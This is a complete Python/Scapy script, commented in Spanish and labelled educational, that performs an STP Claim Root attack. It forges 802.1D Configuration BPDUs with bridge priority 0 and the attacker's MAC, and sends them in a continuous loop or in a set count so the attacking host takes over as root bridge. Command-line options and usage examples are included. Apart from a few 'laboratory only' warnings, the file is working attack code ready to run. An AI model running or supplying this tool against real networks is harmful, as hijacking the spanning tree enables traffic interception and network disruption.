#!/usr/bin/env python3
"""
STP Claim Root Attack - Herramienta Educativa
ADVERTENCIA: Solo para uso en entornos de laboratorio controlados
Autor: Script mejorado para fines educativos
"""

from scapy.all import *
from scapy.layers.l2 import Dot3, LLC, STP
import argparse
import sys
import time
import signal
from datetime import datetime

class Colors:
    """Colores para output en terminal"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class STPAttacker:
    """Clase principal para el ataque STP Claim Root"""
    
    def __init__(self, interface, attacker_mac=None, priority=0, interval=2.0, 
                 root_path_cost=0, port_id=0x8001, message_age=0, max_age=20, 
                 hello_time=2, forward_delay=15, verbose=False):
        """
        Inicializar el atacante STP
        
        Args:
            interface: Interfaz de red a usar
            attacker_mac: MAC del atacante (auto-detecta si es None)
            priority: Prioridad del bridge (0-61440, menor = mejor)
            interval: Intervalo entre BPDUs en segundos
            root_path_cost: Costo del path al root
            port_id: ID del puerto
            message_age: Edad del mensaje
            max_age: Tiempo máximo de vida
            hello_time: Intervalo de hello
            forward_delay: Delay de forwarding
            verbose: Modo verboso
        """
        self.interface = interface
        self.priority = priority
        self.interval = interval
        self.root_path_cost = root_path_cost
        self.port_id = port_id
        self.message_age = message_age
        self.max_age = max_age
        self.hello_time = hello_time
        self.forward_delay = forward_delay
        self.verbose = verbose
        self.packets_sent = 0
        self.running = False
        
        # Obtener MAC del atacante
        if attacker_mac:
            self.attacker_mac = attacker_mac
        else:
            self.attacker_mac = self._get_interface_mac()
        
        # Validar parámetros
        self._validate_parameters()
        
    def _get_interface_mac(self):
        """Obtener MAC address de la interfaz"""
        try:
            mac = get_if_hwaddr(self.interface)
            return mac
        except Exception as e:
            print(f"{Colors.RED}[ERROR] No se pudo obtener MAC de {self.interface}: {e}{Colors.END}")
            sys.exit(1)
    
    def _validate_parameters(self):
        """Validar parámetros de entrada"""
        if self.priority < 0 or self.priority > 61440:
            print(f"{Colors.RED}[ERROR] Prioridad debe estar entre 0-61440{Colors.END}")
            sys.exit(1)
        
        if self.priority % 4096 != 0:
            print(f"{Colors.YELLOW}[WARN] Prioridad debe ser múltiplo de 4096. Ajustando...{Colors.END}")
            self.priority = (self.priority // 4096) * 4096
        
        if self.interval < 0.1:
            print(f"{Colors.YELLOW}[WARN] Intervalo muy bajo, ajustando a 0.1s{Colors.END}")
            self.interval = 0.1
        
        # Validar que los tiempos no excedan los límites de STP (255 segundos max)
        if self.max_age > 255:
            print(f"{Colors.YELLOW}[WARN] Max age muy alto, ajustando a 255s{Colors.END}")
            self.max_age = 255
        
        if self.hello_time > 255:
            print(f"{Colors.YELLOW}[WARN] Hello time muy alto, ajustando a 255s{Colors.END}")
            self.hello_time = 255
        
        if self.forward_delay > 255:
            print(f"{Colors.YELLOW}[WARN] Forward delay muy alto, ajustando a 255s{Colors.END}")
            self.forward_delay = 255
    
    def create_bpdu(self):
        """
        Crear paquete BPDU Configuration correctamente formado manualmente
        
        Returns:
            Paquete BPDU completo
        """
        import struct
        
        # Convertir MAC a formato de bytes
        mac_bytes = bytes.fromhex(self.attacker_mac.replace(':', ''))
        
        # Los valores de tiempo en STP están en unidades de 1/256 segundos
        age_units = int(self.message_age * 256)
        maxage_units = int(self.max_age * 256)
        hello_units = int(self.hello_time * 256)
        fwd_units = int(self.forward_delay * 256)
        
        # Construir el BPDU manualmente según IEEE 802.1D
        # Formato del BPDU Configuration:
        bpdu_data = struct.pack(
            '!HBB',           # Protocol ID (2), Version (1), BPDU Type (1)
            0x0000,           # Protocol Identifier = 0
            0x00,             # Protocol Version = 0
            0x00              # BPDU Type = Configuration (0x00)
        )
        
        bpdu_data += struct.pack('!B', 0x00)  # Flags
        
        # Root Bridge ID (8 bytes: 2 priority + 6 MAC)
        bpdu_data += struct.pack('!H', self.priority) + mac_bytes
        
        # Root Path Cost (4 bytes)
        bpdu_data += struct.pack('!I', self.root_path_cost)
        
        # Bridge ID (8 bytes: 2 priority + 6 MAC)
        bpdu_data += struct.pack('!H', self.priority) + mac_bytes
        
        # Port ID (2 bytes)
        bpdu_data += struct.pack('!H', self.port_id)
        
        # Timers (2 bytes cada uno)
        bpdu_data += struct.pack('!H', age_units)      # Message Age
        bpdu_data += struct.pack('!H', maxage_units)   # Max Age
        bpdu_data += struct.pack('!H', hello_units)    # Hello Time
        bpdu_data += struct.pack('!H', fwd_units)      # Forward Delay
        
        # Construir paquete completo
        pkt = Ether(dst="01:80:c2:00:00:00", src=self.attacker_mac) / \
              LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
              Raw(load=bpdu_data)
        
        return pkt
    
    def display_info(self):
        """Mostrar información del ataque"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}═══════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.HEADER}{Colors.BOLD}       STP CLAIM ROOT ATTACK - MODO EDUCATIVO          {Colors.END}")
        print(f"{Colors.HEADER}{Colors.BOLD}═══════════════════════════════════════════════════════{Colors.END}\n")
        
        print(f"{Colors.CYAN}[INFO] Configuración del Ataque:{Colors.END}")
        print(f"  ├─ Interfaz:          {Colors.GREEN}{self.interface}{Colors.END}")
        print(f"  ├─ MAC Atacante:      {Colors.GREEN}{self.attacker_mac}{Colors.END}")
        print(f"  ├─ Prioridad Bridge:  {Colors.GREEN}{self.priority}{Colors.END} (menor = root)")
        print(f"  ├─ Intervalo BPDU:    {Colors.GREEN}{self.interval}s{Colors.END}")
        print(f"  ├─ Root Path Cost:    {Colors.GREEN}{self.root_path_cost}{Colors.END}")
        print(f"  ├─ Port ID:           {Colors.GREEN}0x{self.port_id:04x}{Colors.END}")
        print(f"  ├─ Hello Time:        {Colors.GREEN}{self.hello_time}s{Colors.END}")
        print(f"  ├─ Max Age:           {Colors.GREEN}{self.max_age}s{Colors.END}")
        print(f"  └─ Forward Delay:     {Colors.GREEN}{self.forward_delay}s{Colors.END}")
        
        print(f"\n{Colors.YELLOW}[!] ADVERTENCIA: Este script solo debe usarse en entornos de laboratorio{Colors.END}")
        print(f"{Colors.YELLOW}[!] El uso no autorizado en redes de producción es ILEGAL{Colors.END}\n")
    
    def send_bpdu_continuous(self):
        """Enviar BPDUs continuamente"""
        self.running = True
        bpdu = self.create_bpdu()
        
        print(f"{Colors.GREEN}[+] Iniciando envío de BPDUs...{Colors.END}")
        print(f"{Colors.CYAN}[*] Presiona Ctrl+C para detener{Colors.END}\n")
        
        try:
            while self.running:
                sendp(bpdu, iface=self.interface, verbose=False)
                self.packets_sent += 1
                
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                if self.verbose:
                    print(f"{Colors.BLUE}[{timestamp}]{Colors.END} BPDU #{self.packets_sent} enviado "
                          f"| Priority: {self.priority} | MAC: {self.attacker_mac}")
                elif self.packets_sent % 10 == 0:
                    print(f"{Colors.BLUE}[{timestamp}]{Colors.END} {self.packets_sent} BPDUs enviados...", end='\r')
                
                time.sleep(self.interval)
                
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"\n{Colors.RED}[ERROR] {e}{Colors.END}")
            self.stop()
    
    def send_bpdu_count(self, count):
        """Enviar número específico de BPDUs"""
        bpdu = self.create_bpdu()
        
        print(f"{Colors.GREEN}[+] Enviando {count} BPDUs...{Colors.END}\n")
        
        try:
            for i in range(count):
                sendp(bpdu, iface=self.interface, verbose=False)
                self.packets_sent += 1
                
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                if self.verbose:
                    print(f"{Colors.BLUE}[{timestamp}]{Colors.END} BPDU #{self.packets_sent} enviado")
                else:
                    print(f"Progreso: {i+1}/{count}", end='\r')
                
                if i < count - 1:
                    time.sleep(self.interval)
            
            print(f"\n{Colors.GREEN}[✓] Completado: {count} BPDUs enviados{Colors.END}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Interrumpido por usuario{Colors.END}")
        except Exception as e:
            print(f"\n{Colors.RED}[ERROR] {e}{Colors.END}")
    
    def stop(self):
        """Detener el ataque"""
        self.running = False
        print(f"\n\n{Colors.YELLOW}[!] Deteniendo ataque...{Colors.END}")
        print(f"{Colors.GREEN}[✓] Total de BPDUs enviados: {self.packets_sent}{Colors.END}")
        print(f"{Colors.CYAN}[INFO] Ataque finalizado{Colors.END}\n")
    
    def show_bpdu_details(self):
        """Mostrar detalles del BPDU que se enviará"""
        bpdu = self.create_bpdu()
        print(f"\n{Colors.HEADER}{'═' * 50}{Colors.END}")
        print(f"{Colors.HEADER}DETALLES DEL BPDU{Colors.END}")
        print(f"{Colors.HEADER}{'═' * 50}{Colors.END}\n")
        bpdu.show()
        print()


def signal_handler(sig, frame):
    """Manejador de señales para Ctrl+C"""
    print(f"\n{Colors.YELLOW}[!] Señal de interrupción recibida{Colors.END}")
    sys.exit(0)


def check_root():
    """Verificar si el script se ejecuta como root"""
    if os.geteuid() != 0:
        print(f"{Colors.RED}[ERROR] Este script requiere privilegios de root{Colors.END}")
        print(f"{Colors.CYAN}[INFO] Ejecuta: sudo python3 {sys.argv[0]}{Colors.END}")
        sys.exit(1)


def main():
    # Registrar manejador de señales
    signal.signal(signal.SIGINT, signal_handler)
    
    # Parser de argumentos
    parser = argparse.ArgumentParser(
        description="STP Claim Root Attack - Herramienta Educativa para Laboratorio",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  %(prog)s -i eth0 -p 0                    # Prioridad máxima
  %(prog)s -i eth0 -p 4096 -t 1.0 -v       # Prioridad 4096, intervalo 1s, verbose
  %(prog)s -i eth0 -c 100                  # Enviar solo 100 BPDUs
  %(prog)s -i eth0 --show-packet           # Mostrar detalles del BPDU

ADVERTENCIA: Solo para uso educativo en entornos de laboratorio controlados.
        """
    )
    
    parser.add_argument('-i', '--interface', required=True, help='Interfaz de red (ej: eth0)')
    parser.add_argument('-m', '--mac', help='MAC del atacante (auto-detecta si no se especifica)')
    parser.add_argument('-p', '--priority', type=int, default=0, help='Prioridad del bridge (0-61440, default: 0)')
    parser.add_argument('-t', '--interval', type=float, default=2.0, help='Intervalo entre BPDUs en segundos (default: 2.0)')
    parser.add_argument('-c', '--count', type=int, help='Número de BPDUs a enviar (continuo si no se especifica)')
    parser.add_argument('--cost', type=int, default=0, help='Root path cost (default: 0)')
    parser.add_argument('--port-id', type=lambda x: int(x, 0), default=0x8001, help='Port ID en hex (default: 0x8001)')
    parser.add_argument('--hello', type=int, default=2, help='Hello time en segundos (default: 2)')
    parser.add_argument('--max-age', type=int, default=20, help='Max age en segundos (default: 20)')
    parser.add_argument('--forward-delay', type=int, default=15, help='Forward delay en segundos (default: 15)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verboso')
    parser.add_argument('--show-packet', action='store_true', help='Mostrar detalles del BPDU y salir')
    
    args = parser.parse_args()
    
    # Verificar privilegios root
    check_root()
    
    # Crear instancia del atacante
    attacker = STPAttacker(
        interface=args.interface,
        attacker_mac=args.mac,
        priority=args.priority,
        interval=args.interval,
        root_path_cost=args.cost,
        port_id=args.port_id,
        hello_time=args.hello,
        max_age=args.max_age,
        forward_delay=args.forward_delay,
        verbose=args.verbose
    )
    
    # Mostrar información
    attacker.display_info()
    
    # Si solo quiere ver el paquete
    if args.show_packet:
        attacker.show_bpdu_details()
        sys.exit(0)
    
    # Ejecutar ataque
    if args.count:
        attacker.send_bpdu_count(args.count)
    else:
        attacker.send_bpdu_continuous()


if __name__ == "__main__":
    main()